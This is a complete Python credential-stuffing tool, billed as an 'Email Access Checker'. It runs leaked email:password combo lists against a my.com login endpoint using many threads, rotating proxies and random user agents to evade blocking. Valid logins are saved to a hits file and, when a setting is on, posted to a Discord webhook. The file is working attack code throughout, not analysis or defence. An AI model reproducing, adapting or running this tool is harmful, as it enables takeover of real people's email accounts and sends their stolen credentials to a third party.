from colorama import init,Fore,Style
from os import name,system
from sys import stdout
from random import choice
from threading import Thread,Lock,active_count,Timer
from time import sleep
from datetime import datetime
import requests
import json

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title:str):
        if name == 'posix':
            stdout.write(f"\x1b]2;{title}\x07")
        elif name in ('ce', 'nt', 'dos'):
            system(f'title {title}')
        else:
            stdout.write(f"\x1b]2;{title}\x07")

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def ReadFile(self,filename,method):
        with open(filename,method,encoding='utf8') as f:
            content = [line.strip('\n') for line in f]
            return content

    def ReadJson(self,filename,method):
        with open(filename,method) as f:
            return json.load(f)

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('[Data]/useragents.txt','r')
        return choice(useragents)

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        proxies = {}
        if self.use_proxy == 1:
            if self.proxy_type == 1:
                proxies = {
                    "http":"http://{0}".format(choice(proxies_file)),
                    "https":"https://{0}".format(choice(proxies_file))
                }
            elif self.proxy_type == 2:
                proxies = {
                    "http":"socks4://{0}".format(choice(proxies_file)),
                    "https":"socks4://{0}".format(choice(proxies_file))
                }
            else:
                proxies = {
                    "http":"socks5://{0}".format(choice(proxies_file)),
                    "https":"socks5://{0}".format(choice(proxies_file))
                }
        else:
            proxies = {
                    "http":None,
                    "https":None
            }
        return proxies

    def CalculateCpm(self):
        self.cpm = self.maxcpm * 60
        self.maxcpm = 0
        Timer(1.0, self.CalculateCpm).start()

    def TitleUpdate(self):
        while True:
            self.SetTitle(f'[One Man Builds Email Access Checker Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| CPM:{self.cpm} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries} ^| THREADS: {active_count()-1}')
            sleep(0.1)

    def __init__(self):
        init(convert=True)
        self.SetTitle('[One Man Builds Email Access Checker Tool]')
        self.clear()
        self.title = Style.BRIGHT+Fore.GREEN+"""                                        
                                  ╔═════════════════════════════════════════════════╗    
                                            ╔═╗╔╦╗╔═╗╦╦    ╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗
                                            ║╣ ║║║╠═╣║║    ╠═╣║  ║  ║╣ ╚═╗╚═╗
                                            ╚═╝╩ ╩╩ ╩╩╩═╝  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝
                                  ╚═════════════════════════════════════════════════╝

                
        """
        print(self.title)
        self.hits = 0
        self.bads = 0
        self.retries = 0
        self.webhook_retries = 0
        self.maxcpm = 0
        self.cpm = 0
        self.lock = Lock()
        self.session = requests.Session()

        config = self.ReadJson('[Data]/configs.json','r')

        self.use_proxy = config['use_proxy']
        self.proxy_type = config['proxy_type']
        self.threads_num = config['threads']
        self.webhook_enable = config['webhook_enable']
        self.webhook_url = config['webhook_url']

        print('')

    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
        try:
            timestamp = str(datetime.utcnow())

            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
            
            headers = {
                'User-Agent':useragent,
                'Pragma':'no-cache',
                'Accept':'*/*',
                'Content-Type':'application/json'
            }

            payload = json.dumps(message_to_send)

            response = self.session.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)

            if response.text == "":
                pass
            elif "You are being rate limited." in response.text:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
            else:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
        except:
            self.webhook_retries += 1
            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)

    def Check(self,email,password):
        try:
            useragent = self.GetRandomUserAgent()

            headers = {
                'User-Agent':useragent,
                'Content-Type':'application/x-www-form-urlencoded',
                'Pragma':'no-cache',
                'Accept':'*/*'
            }

            proxy = self.GetRandomProxy()
        
            response = self.session.get(f'https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}',headers=headers,proxies=proxy)

            self.maxcpm += 1

            if 'Ok=0' in response.text:
                self.bads += 1
                self.PrintText(Fore.WHITE,Fore.RED,'BAD',f'{email}:{password}')
                with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{email}:{password}\n')
            elif 'Ok=1' in response.text:
                self.hits += 1
                self.PrintText(Fore.WHITE,Fore.GREEN,'HIT',f'{email}:{password}')
                with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
                    f.write(f'{email}:{password}\n')
                if self.webhook_enable == 1:
                    self.SendWebhook('EmailAccess',f'{email}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://freepikpsd.com/wp-content/uploads/2019/10/email-logo-png-white-5-Transparent-Images.png',proxy,useragent)
            else:
                self.retries += 1
                self.Check(email,password)
        except:
            self.retries += 1
            self.Check(email,password)

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        self.CalculateCpm()
        combos = self.ReadFile('[Data]/combos.txt','r')
        for combo in combos:
            Run = True
            email = combo.split(':')[0]
            password = combo.split(':')[1]
            while Run:
                if active_count()<=self.threads_num:
                    Thread(target=self.Check,args=(email,password)).start()
                    Run = False

if __name__ == '__main__':
    main = Main()
    main.Start()